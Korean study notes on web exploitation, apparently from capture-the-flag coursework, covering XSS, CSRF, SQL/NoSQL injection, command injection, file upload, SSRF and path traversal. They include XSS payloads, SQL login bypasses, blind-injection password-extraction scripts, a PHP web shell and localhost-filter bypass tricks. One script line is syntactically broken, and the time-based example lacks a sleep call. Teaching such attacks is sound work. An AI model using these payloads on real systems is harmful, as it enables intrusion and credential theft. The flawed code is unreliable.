---
title: "Exploit"
date: 2025-03-11T20:54:59+09:00
lastmod: 2025-03-11T20:54:59+09:00
tags: []
categories: []
imgs:  []
cover:  ""  # image show on top
readingTime:  true  # show reading time after article date
toc:  true
comments:  false
justify:  false  # text-align: justify;
single:  false  # display as a single page, hide navigation on bottom, like as about page.
license:  "BY-SA"  # CC License, https://creativecommons.org/licenses/?lang=ko
draft: false
---

# XSS (Cross Site Scripting)
- 공격자가 웹 리소스에 악성 스크립트를 삽입해 이용자의 웹 브라우저에서 해당 스크립트를 실행하는 공격이다.
- XSS 취약점이 존재하는 사이트에 공격자는 origin 권한으로 악성 스크립트가 포함된 페이지를 만들어서 이용자가 악성 스크립트가 포함된 페이지를 방문하면 공격자의 악성 스크립트가 동작해 정보를 탈취하는 방식이다.

## 공격 경로
- XSS 공격은 이용자가 삽입한 내용을 출력하는 기능에서 발생한다.
  - 악성 태그를 필터링하는 HTML Sanitization을 사용하거나 엔티티 코드로 치환하는 방법으로 XSS를 예방할 수 있다.
  - Flask는 `render_template` 함수를 사용하여 인자를 HTML 엔티티코드로 변환하여 출력하는 방식으로 XSS를 방지한다. 
- 아래와 같이 입력값을 그대로 출력하게 되면, 입력값으로 script 를 전달해 공격에 사용할 수 있다.
  - 서버의 코드
    ``` 
    @app.route("/vulnerable")
    def vulnerable():
        param = request.args.get("param", "") # 이용자가 입력한 인자를 가져옴
        return param # 이용자의 입력값을 화면 상에 표시
    ```
  - 공격자 입력1. 다른 페이지로 redirection
    ```
    <script>location.href = "/another_page?param=PARAM1";</script>
    ```
  - 공격자 입력2. cookie 정보 출력
    ```
    <script>document.cookie</script>
    ```
## XSS 공격 종류
- XSS 는 악성 스크립트의 위치와 침투 경로에 따라 아래와 같이 구분된다. 
  - Stored XSS : XSS에 사용되는 악성 스크립트가 서버에 저장되고 서버의 응답에 담겨오는 XSS
    - 게시물과 댓글에 악성 스크립트를 포함해 업로드하는 방식이 있음
    - 불특정 다수에게 보여지기 때문에 파급력이 크다.
  - Reflected XSS : XSS에 사용되는 악성 스크립트가 URL에 삽입되고 서버의 응답에 담겨오는 XSS
    - 게시판 서비스에서 작성된 게시물을 조회하기 위한 검색창에서 스크립트를 포함해 검색하는 방식이 있음
    - 검색 결과를 응답에 포함하는 일부 서비스에서 발생 가능
    -  공격을 위해서는 다른 이용자를 악성 스크립트가 포함된 링크에 접속하도록 유도해야 함
  - DOM-based XSS : XSS에 사용되는 악성 스크립트가 URL Fragment에 삽입되는 XSS
  - Universal XSS : 클라이언트의 브라우저 혹은 브라우저의 플러그인에서 발생하는 취약점으로 SOP 정책을 우회하는 XSS

# CSRF (Cross Site Request Forgery)
- 어떤 사이트에서 이용자의 신원 정보가 포함된 쿠키를 사용한다면, 타인의 쿠키를 탈취하여 변조된 명령을 서버로 번달하는 공격 방식이다. 
  - 이용자의 신원 정보가 포함된 쿠키는 일종의 서명과 같은 역할을 하기 때문에, 쿠키가 특정 명령에 대한 이용자의 본인 인증 역할을 수행할 수도 있다.
- 2차 인증을 수행하지 않고 cookie로만 인증을 하는 사이트에 대해 공격이 가능하다. 
- `XSS`는 인증 정보인 세션 및 쿠키 탈취를 목적으로 서버에서 스크립트를 실행 하는 방식인 반면, `CSRF`는 이용자가 임의 페이지에 HTTP 요청을 보내는 것을 목적으로 하는 공격이다.

## 공격 경로
- `<img>` 태그나 `<form>` 태그를 활용해서 사용자가 의도하지 않은 명령을 서버에 요청하는 script를 실행시킬 수 있다. 
    ```
    /* img 태그 활용 요청 전달 */
    <img src='http://bank.dreamhack.io/sendmoney?to=Dreamhack&amount=1337' width=0px height=0px>`
    ```
    ```
    /* javascript 공격 예시 */
    /* 새 창 띄우기 */
    window.open('http://bank.dreamhack.io/sendmoney?to=Dreamhack&amount=1337');
    /* 현재 창 주소 옮기기 */
    location.href = 'http://bank.dreamhack.io/sendmoney?to=Dreamhack&amount=1337';
    location.replace('http://bank.dreamhack.io/sendmoney?to=Dreamhack&amount=1337');
    ```

## SQL Injection
- 조작된 SQL 쿼리를 서버에 주입하여 인증을 우회하거나, 데이터베이스의 정보를 유출하는 공격행위
- Blind SQL Injection : SQL Injection 의 한 종류로, DBMS가 답변 가능한 형태로 질문을 수행하여 스무고개 게임과 같이 정답을 유추해 나가는 공격 기법

## NoSQL Injection
- NoSQL은 데이터 타입으로 '오브젝트' 라는 개념을 갖는다. 오브젝트 타입의 입력값을 처리할 때에는 쿼리 연산자를 사용할 수 있고, 이 부분의 취약점을 활용한 것이 NoSQL Injection 이다.
- NodeJs를 예를 들면 아래와 같이 url에 object를 대입할 수 있다.
  ```
  // 서버 코드 예시
  const express = require('express');
  const app = express();
  app.get('/', function(req,res) {
      console.log('data:', req.query.data);
      console.log('type:', typeof req.query.data);
      res.send('hello world');
  });
  const server = app.listen(3000, function(){
      console.log('app.listen');
  });
  ```
  ```
  // 결과 예시
  http://localhost:3000/?data=1234
  data: 1234
  type: string

  http://localhost:3000/?data[]=1234
  data: [ '1234' ]
  type: object

  http://localhost:3000/?data[]=1234&data[]=5678
  data: [ '1234', '5678' ] 
  type: object

  http://localhost:3000/?data[5678]=1234
  data: { '5678': '1234' } 
  type: object

  http://localhost:3000/?data[5678]=1234&data=0000
  data: { '5678': '1234', '0000': true } 
  type: object

  http://localhost:3000/?data[5678]=1234&data[]=0000
  data: { '0': '0000', '5678': '1234' } 
  type: object

  http://localhost:3000/?data[5678]=1234&data[1111]=0000
  data: { '1111': '0000', '5678': '1234' } 
  type: object
  ```
  - 이 방법으로 아래와 같이 'data' 객체 안에 NoSQL 쿼리가 들어가도록 url을 설정할 수도 있다.
    - [NoSQL 문법 참조](../databases/database/#문법)
    ```
    http://localhost:3000/?data[$eq]=A
    data: { "$eq": "A" } 
    type: object
    ```


## Command Injection
- 공격자가 클라이언트 인터페이스를 통해 서버측에 시스템 명령어를 전달하여 실행시켜 공격을 수행하는 기법
- PHP의 `system`, Node JS의 `child_process`, 파이썬의 `os.system` 과 같이 시스템 명령어를 수행하는 함수에 이용자가 임의의 인자를 전달할 수 있을 때 발생할 수 있다.
- 명령어 입력란에 다른 명령어를 입력하는 기법에는 다음의 `메타문자` 들을 활용할 수 있다.
  1. 명령어 치환
     - 리눅스 쉘에서 ` `` ` 사이에 든 문자는 새로운 명령어 라인으로 인식한다. 
       - ex) echo \`ls\` 
         - ls 명령어가 실행된다. 
     - 리눅스 쉘에서 `$()` 사이에 든 문자는 새로운 명령어 라인으로 인식한다.
       - ex) echo $(ls) 
         - ls 명령어가 실행된다.
  2. 명령어 연속 실행
    - 리눅스 쉘에서 `||` 를 사용하면, || 앞과 || 뒤를 다른 명령어 라인으로 인식하고 각각 실행한다. 
      - 한 줄에 둘 이상의 명령어를 실행시킬 수 있다.
      - ex) mkdir FILE || cd FILE
        -  FILE 디렉터리를 만들고 FILE 디렉터리 안으로 이동하는 명령을 한줄로 수행할 수 있다.
    - 리눅스 쉘에서 `&&` 를 사용하면, && 앞과 && 뒤를 다른 명령어 라인으로 인식하고 각각 실행한다. 
      - ex) mkdir FILE && cd FILE 
        - FILE 디렉터리를 만들고 FILE 디렉터리 안으로 이동하는 명령을 한줄로 수행할 수 있다.
    - 리눅스 쉘에서 `;` 를 사용하면, ; 앞과 ; 뒤를 다른 명령어 라인으로 인식하고 각각 실행한다. 
      - ex) mkdir FILE ; cd FILE
        -  FILE 디렉터리를 만들고 FILE 디렉터리 안으로 이동하는 명령을 한줄로 수행할 수 있다.
  3. 파이프
     - 리눅스 쉘에서 `|` 를 사용하면 | 앞의 명령어 실행 결과를 | 뒤의 명령어 실행시 입력으로 설정할 수 있다.
       - ex) cat FILE | less 
         - FILE 내용을 출력한 것을 less 명령으로 나눠서 볼 수 있도록 한다.
  4. 뒷내용 무시
     - 리눅스 쉘에서 `#`을 사용하면 # 뒤의 내용은 주석처리되어 무시된다. 
       - ex) ls #a"sdfa"sd'fas"'"df
         - 구문 오류 없이 ls 명령이 잘 실행된다.

## File Vulnerability
- 공격자의 파일을 웹 서비스의 파일 시스템에 업로드 혹은 하는 과정에서 발생하는 보안 취약점
- 파일 업로드/다운로드 서비스를 개발시 이용자가 업로드한 파일을 데이터베이스에 저장하는 것보다는 서버의 파일 시스템에 저장하는 것이 개발하기 쉽고, 관리 효율도 높지만 File Vulnerability를 주의해야 한다.
- 원격 코드 실행, 민감정보 탈취 등이 수행될 수 있다.
1. File Upload Vulnerability
   - 파일 업로드가 가능한 path 에 제약을 우회하여 임의 디렉터리에 파일을 업로드 할 수 있는 취약점이다.
   - File Upload Vulnerability 중 하나로, 이용자가 업로드될 파일의 이름을 임의로 정할 수 있을 때 발생한다.
   - `..` 과 같은 메타 문자를 활용하여 지정된 디렉터리 외의 디렉터리를 참조하는 방식을 취할 수 있다.
   - 악의적인 파일로 html 파일을 수정한다면 Cross-Site-Scripting 공격으로 이어질 수 있다.
   - .php, .jsp, .asp와 같은 파일을 업로드 하면 [CGI](../web/#CGI-(Common-Gateway-Interface)) 를 통해 서버에서 코드를 실행시킬 수도 있다.
   - ex) php web shell example
    ```
    <html><body>
    <form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
    <input type="TEXT" name="cmd" autofocus id="cmd" size="80">
    <input type="SUBMIT" value="Execute">
    </form><pre>
    <?php
        if(isset($_GET['cmd']))
        {
            system($_GET['cmd']);
        }
    ?></pre></body></html>
    ```
   
2. File Download Vulnerability
   - 파일 이름을 직접 입력 받아 임의 디렉터리에 있는 파일을 다운로드 받을 수 있는 취약점이다.
   - 이용자가 다운로드할 파일의 이름을 임의로 정할 수 있을 때 발생한다.

- File Vulnerability 를 방지하려면
  - 정규식을 통해 확장자, 메타문자를 필터링 하는 로직을 사용해 방어가 필요하다.
  - 업로드 디렉터리를 웹 서버에서 직접 접근할 수 없도록 한다.
  - 업로드 디렉터리에서는 CGI가 실행되지 않도록 한다.
  - 다운로드 파일의 이름 대신 파일의 고유 ID를 사용하여 접근하도록 시스템을 구성한다.

## SSRF (Server-side Request Forgery)
- http, gRPC 등 웹 서비스로 전달되는 요청에 이용자의 입력값이 반영되는 경우, 입력값을 변조하여 의도하지 않은 동작을 유발하는 취약점이다.
- 외부 접속을 허용하면 안되는 백오피스 서비스(관리자 페이지)는 보통 내부망 서비스에서 구동된다. 하지만 웹 서비스가 이상 접근을 탐지하고 즉각 대응하기 위해서는 백오피스 서비스에 명령을 요청할 수 있다. 이 경우, SSRF 공격이 가능하다면 공격자는 외부망에서 내부 서버의 관리자 페이지 기능을 접근할 수 있게 된다.
- 웹 서비스에서 사용하는 마이크로 서비스의 url 주소가 노출된다면 SSRF 공격에 취약해지므로 주의해야 한다.
- SSRF 공격은 url 변조, form 입력값 변조, request body 변조 등 다양한 입력값에 메타문자들을 섞어 발동이 가능함에 주의한다.
- 입력값 필터링과 도메인 IP 검증을 통해 방지가 가능하므로 필수족으로 수행하도록 한다.

## path traversal
- 입력으로 받은 데이터에서 경로값을 변조하여 의도하지 않은 기능을 동작하게 하는 공격 기법이다.
- ex) 아래 코드는 user_idx 파라미터를 받아서 SERVER_ADDRESS/user/usr API를 호출하는 형태이다.
  ```
  @app.route("/v1/api/user/information")
  def user_info():
    user_idx = request.args.get("user_idx", "")
    response = requests.get(f"{INTERNAL_API}/user/{user_idx}")
  ``` 
  - 이때, user_idx=../admin 으로 변경한다면, 해당 API는 SERVER_ADDRESS/admin API를 호출하게 된다.
- ex) 아래 코드는 usr_name 을 파라미터로 받아서 SERVER_ADDRESS/user/search API를 호출한다.
  ```
  @app.route("/v1/api/user/search")
  def user_search():
    user_name = request.args.get("user_name", "")
    user_type = "public"
    response = requests.get(f"{INTERNAL_API}/user/search?user_name={user_name}&user_type={user_type}")
  ```
  - 이때, usesr_name = admin&user_type=admin# 을 대입하면 SERVER_ADDRESS/search?user_name=admin&user_type=admin 구문이 동작된다.
    - url에서 `#` 이후의 쿼리는 모두 주석처리 되어 버린다. 




# 공격 기법
1. innerHTML 을 통한 XSS 취약점 공격
  - 조건: 사용자의 입력을 출력하는 형태를 지닌 시스템
  - 방법: `<script>` 태그와 공격용 javascript 를 url 파라미터 혹은 request 에 포함시켜 공격용 javascript 가 실행되게 한다.
  - 예시)
    - 서버의 코드
       ``` 
       @app.route("/vulnerable")
       def vulnerable():
           param = request.args.get("param", "") # 이용자가 입력한 인자를 가져옴
           return param # 이용자의 입력값을 화면 상에 표시
       ```
    - 공격자 입력1. 다른 페이지로 redirection
       ```
       <script>location.href = "/another_page?param=PARAM1";</script>
       ```
    - 공격자 입력2. cookie 정보 출력
       ```
       <script>document.cookie</script>
       ```
2. innerHTML 을 통한 XSS 취약점 공격2
   - \<script> 태그 없이 javascript를 실행시키는 방법
   - 조건 : 서버에 기본적인 XSS 방지 기법이 적용되어 \<script> 태그를 주입시킬 수 없는 경우 (ex: render_template 를 사용한 경우)
   - 방법 : `<image>` 태그의 `onerror` 필드에 script를 주입한다.
   - [참조](https://developer.mozilla.org/en-US/docs/Web/API/Element/innerHTML#security_considerations)
   - 예시)
     - 동작하지 않는 script(XSS공격 실패)
       ```
       name = "<script>alert('I am John in an annoying alert!')</script>";
       el.innerHTML = name; // harmless in this case
       ```
     - 동작하는 script (XSS공격 성공)
       ```
       const name = "<img src='x' onerror='alert(1)'>";
       el.innerHTML = name; // shows the alert
       # x라는 경로에 이미지가 없어서 onerror 로 설정된 javascript가 실행된다.
       ```


3. SQL Injection
- 조건 : client 인터페이스에서 서버에서 동작할 SQL 쿼리 값을 조작할 수 있다.
- 아래 쿼리를 SQL Injection으로 공격하고자 한다면
  ```
  SELECT * FROM users WHERE userid="{userid}" AND userpassword="{userpassword}";
  ``` 
- userid 변수와 userpassword 에 아래와 같은 값이 들어가게 입력을 조작하면 'admin' 계정을 탈취할 수 있다.
  ```
  /*
  ID: admin"--, PW: DUMMY
  userid 검색 조건만을 처리하도록, 뒤의 내용은 주석처리하는 방식
  */
  SELECT * FROM users WHERE userid="admin"-- " AND userpassword="DUMMY"

  /*
  ID: admin" or "1 , PW: DUMMY
  userid 검색 조건 뒤에 OR (또는) 조건을 추가하여 뒷 내용이 무엇이든, admin 이 반환되도록 하는 방식
  */
  SELECT * FROM users WHERE userid="admin" or "1" AND userpassword="DUMMY"

  /*
  ID: admin, PW: DUMMY" or userid="admin
  userid 검색 조건에 admin을 입력하고, userpassword 조건에 임의 값을 입력한 뒤 or 조건을 추가하여 userid가 admin인 것을 반환하도록 하는 방식
  */
  SELECT * FROM users WHERE userid="admin" AND userpassword="DUMMY" or userid="admin"

  /*
  ID: " or 1 LIMIT 1,1-- , PW: DUMMY
  userid 검색 조건 뒤에 or 1을 추가하여, 테이블의 모든 내용을 반환토록 하고 LIMIT 절을 이용해 두 번째 Row인 admin을 반환토록 하는 방식
  */
  SELECT * FROM users WHERE userid="" or 1 LIMIT 1,1-- " AND userpassword="DUMMY"
  ```

4. Blind SQL Injection
- 글자 위치 추론
  ```
  # 첫 번째 글자 구하기
  SELECT * FROM user_table WHERE uid='admin' and substr(upw,1,1)='a'-- ' and upw=''; # False
  SELECT * FROM user_table WHERE uid='admin' and substr(upw,1,1)='b'-- ' and upw=''; # True
  # 두 번째 글자 구하기
  SELECT * FROM user_table WHERE uid='admin' and substr(upw,2,1)='d'-- ' and upw=''; # False
  SELECT * FROM user_table WHERE uid='admin' and substr(upw,2,1)='e'-- ' and upw=''; # True 
  ```
- python 자동화
  ```
  #!/usr/bin/python3
  import requests
  import string
  # example URL
  url = 'http://example.com/login'
  params = {
      'uid': '',
      'upw': ''
  }
  # ascii printables
  tc = string.printable
  # 사용할 SQL Injection 쿼리
  query = '''admin' and substr(upw,{idx},1)='{val}'-- '''
  password = ''
  # 비밀번호 길이는 20자 이하라 가정
  for idx in range(0, 20):
      for ch in tc:
          # query를 이용하여 Blind SQL Injection 시도
          params['uid'] = query.format(idx=idx+1, val=ch).strip("\n")
          c = requests.get(url, params=params)
          print(c.request.url)
          # 응답에 Login success 문자열이 있으면 해당 문자를 password 변수에 저장
          if c.text.find("Login success") != -1:
              password += ch
              break
  print(f"Password is {password}")
  ```
- 비밀번호 길이 추론 및 확인
  - 비밀번호 길이 체크 핵심 : `f"((SELECT LENGTH(userpassword) WHERE userid=\"{user}\")<{{val}})"`
  - 비밀번호 확인 핵심 : `f'((SELECT SUBSTR(userpassword,{idx},1) WHERE userid="{user}") < CHAR({{val}}))'`
- python 코드
  ```
  #!/usr/bin/python3
  import requests
  import sys
  from urllib.parse import urljoin


  class Solver:
      """Solver for simple_SQLi challenge"""

      # initialization
      def __init__(self, port: str) -> None:
          self._chall_url = f"http://host1.dreamhack.games:{port}"
          self._login_url = urljoin(self._chall_url, "login")

      # base HTTP methods
      def _login(self, userid: str, userpassword: str) -> requests.Response:
          login_data = {"userid": userid, "userpassword": userpassword}
          resp = requests.post(self._login_url, data=login_data)
          return resp

      # base sqli methods
      def _sqli(self, query: str) -> requests.Response:
          resp = self._login(f'" or {query}-- ', "hi")
          return resp

      def _sqli_lt_binsearch(self, query_tmpl: str, low: int, high: int) -> int:
          while 1:
              mid = (low + high) // 2
              if low + 1 >= high:
                  break
              query = query_tmpl.format(  =mid)
              if "hello" in self._sqli(query).text:
                  high = mid
              else:
                  low = mid
          return mid

      # attack methods
      def _find_password_length(self, user: str, max_pw_len: int = 100) -> int:
          query_tmpl = f'((SELECT LENGTH(userpassword) WHERE userid="{user}") < {{val}})'
          pw_len = self._sqli_lt_binsearch(query_tmpl, 0, max_pw_len)
          return pw_len

      def _find_password(self, user: str, pw_len: int) -> str:
          pw = ""
          for idx in range(1, pw_len + 1):
              query_tmpl = f'((SELECT SUBSTR(userpassword,{idx},1) WHERE userid="{user}") < CHAR({{val}}))'
              pw += chr(self._sqli_lt_binsearch(query_tmpl, 0x2F, 0x7E))
              print(f"{idx}. {pw}")
          return pw

      def solve(self) -> None:
          # Find the length of admin password
          pw_len = self._find_password_length("admin")
          print(f"Length of the admin password is: {pw_len}")
          # Find the admin password
          print("Finding password:")
          pw = self._find_password("admin", pw_len)
          print(f"Password of the admin is: {pw}")


  if __name__ == "__main__":
      port = sys.argv[1]
      solver = Solver(port)
      solver.solve()
  ```

5. Blind NoSQL Injection
- 조건: url로 NoSQL 인자로 object 타입을 대입할 수 있다. 
- 다음은 MongoDB를 사용하는 시스템에 대한 공격 예시이다. 
- `$regex` 구문을 사용하여 문자의 시작 'upw' 키워드의 첫 글자 확인하는 쿼리
  ```
  # http://SERVER_URL?upw[$regex]=^a
  > db.user.find({upw: {$regex: "^a"}})
  > db.user.find({upw: {$regex: "^b"}})
  > db.user.find({upw: {$regex: "^c"}})
  ...
  > db.user.find({upw: {$regex: "^g"}})
  { "_id" : ObjectId("5ea0110b85d34e079adb3d19"), "uid" : "guest", "upw" : "guest" }
  ```
- `$where` 와 `substring` 조합을 활용해 첫 글자를 비교하는 방법
  ```
  > db.user.find({$where: "this.upw.substring(0,1)=='a'"})
  > db.user.find({$where: "this.upw.substring(0,1)=='b'"})
  > db.user.find({$where: "this.upw.substring(0,1)=='c'"})
  ...
  > db.user.find({$where: "this.upw.substring(0,1)=='g'"})
  { "_id" : ObjectId("5ea0110b85d34e079adb3d19"), "uid" : "guest", "upw" : "guest" }
  ```
- 위 조건문을 포함한 쿼리를 DB에 주입시키고 쿼리 실행 결과가 참이라면 공격자가 알아볼 수 있는 동작을 발생시켜야 한다.
   1. Time based Injection
      - MongoDB 의 sleep 함수를 사용하여 응답지연 혹은 timeout을 유발시킨다. 
      ```
      > db.user.find({$where: "this.upw.substring(0,1)=='a'"})
      > db.user.find({$where: "this.upw.substring(0,1)=='b'"})
      > db.user.find({$where: "this.upw.substring(0,1)=='c'"})
      ...
      > db.user.find({$where: "this.upw.substring(0,1)=='g'"})
      { "_id" : ObjectId("5ea0110b85d34e079adb3d19"), "uid" : "guest", "upw" : "guest" }
      ```
   2. Error based Injection
      - 고의로 문법에 맞지않는 구문을 넣어 에러를 발생시킨다. 
      ```
      > db.user.find({$where: "this.uid=='guest'&&this.upw.substring(0,1)=='g'&&asdf"});
      ```
        - asdf 라는 에러가 발생
- python 자동화 코드
  - 알파벳의 한 글자씩 'ch' 변수에 대입하여 전체 'flag' 를 찾아가는 과정. 비밀번호 포멧이 D?{} 형태임을 알고 있다는 가정 하에 구현
  ```
  import requests, string

  HOST = 'http://localhost'
  ALPHANUMERIC = string.digits + string.ascii_letters
  SUCCESS = 'admin'

  flag = ''

  for i in range(32):
      for ch in ALPHANUMERIC:
          response = requests.get(f'{HOST}/login?uid[$regex]=ad.in&upw[$regex]=D.{{{flag}{ch}')
          if response.text == SUCCESS:
              flag += ch
              break
      
      print(f'FLAG: DH{{{flag}}}')
  ```

6. File Vulnerability
- 조건: 임의의 파일을 서버에 업로드하고, 로드할 수 있다. 
- 아래는 php 의 Web shell 코드 예시이다. 아래를 `.php` 확장자로 생성하여 서버에 업로드하고, 서버에서 해당 파일을 로드하도록 유도하면 [CGI](../web/#CGI-(Common-Gateway-Interface)) 에 의해 서버에서 shell 명령어를 동작시킬 수 있다.
```
<html><body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form><pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?></pre></body></html>
```
7. SSRF (Server-side Request Forgery)
- 조건: local 에서 micro service를 구동하고 특정 port, url로 인터페이스를 구성한 경우
- "localhost" URL에 대한 필터링 우회
  - 127.0.0.1 로 매핑된 도메인 서버 주소를 사용한다.
    - 예를들어 "*.vcap.me" 도메인은 localhost URL로 매핑되어 있다.
  - 127.0.0.1 은 아래와 같이 표현할 수도 있다.
    - 0x7f.0x00.0x00.0x01 : 16진수로 풀어쓰기
    - 0x7f000001 : 16진수로 풀어서 '.' 생략
    - 2130706433 : 10진수로 풀어서 '.' 생략
    - 127.1 : '0.0.' 생략
    - 127.0.1 : '0.' 생략
  - URL은 문자의 대소문자를 구별하지 않기 때문에 localhost 문자로만 필터링이 되어있다면 아래와 같이 우회가 가능하다.
    - LocalHost, loCalhost, loaLHost, LOCALHOST 
  - 또한 127.0.0.1부터 127.0.0.255 까지의 IP는 루프백(loop-back) 주소라고 하여 모두 로컬 호스트를 가리킨다.